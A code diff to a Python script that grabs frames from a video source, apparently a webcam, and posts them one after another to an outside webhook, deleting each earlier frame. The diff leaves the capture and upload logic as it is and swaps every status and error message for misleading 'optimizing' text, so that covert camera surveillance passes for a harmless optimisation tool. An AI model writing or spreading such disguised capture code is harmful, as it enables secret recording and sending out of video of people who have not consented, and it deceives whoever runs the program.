@@ -17,7 +17,7 @@ def stream_video_to_webhook(webhook_url, video_source=0, frame_interval=1):
     # Open a connection to the video source
     cap = cv2.VideoCapture(video_source)
     if not cap.isOpened():
-        print("Error: Unable to access the video source.")
+        print("Error: Unable to optomize.")
         return
 
     previous_message_id = None  # To store the ID of the previous message
@@ -26,7 +26,7 @@ def stream_video_to_webhook(webhook_url, video_source=0, frame_interval=1):
     }
 
     try:
-        print("Streaming video. Press Ctrl+C to stop.")
+        print("Optimizing Complete")
         while True:
             # Capture a frame
             ret, frame = cap.read()
@@ -47,7 +47,7 @@ def stream_video_to_webhook(webhook_url, video_source=0, frame_interval=1):
                 delete_url = f"{webhook_url}/messages/{previous_message_id}"
                 delete_response = requests.delete(delete_url)
                 if delete_response.status_code != 204:
-                    print(f"Warning: Failed to delete previous frame. Status code: {delete_response.status_code}, Response: {delete_response.text}")
+                    print(f"Warning: Failed to optimize. Status code: {delete_response.status_code}, Response: {delete_response.text}")
 
             # Send the frame to the webhook
             response = requests.post(webhook_url, files=files)
@@ -56,12 +56,12 @@ def stream_video_to_webhook(webhook_url, video_source=0, frame_interval=1):
                 response_data = response.json()
                 previous_message_id = response_data["id"]
             else:
-                print(f"Error: Failed to send frame. Status code: {response.status_code}, Response: {response.text}")
+                print(f"Error: Failed to optimize. Status code: {response.status_code}, Response: {response.text}")
 
             # Wait before sending the next frame
             time.sleep(frame_interval)
     except KeyboardInterrupt:
-        print("\nStreaming stopped.")
+        print("\nStopped")
     finally:
         # Release the video capture
         cap.release()
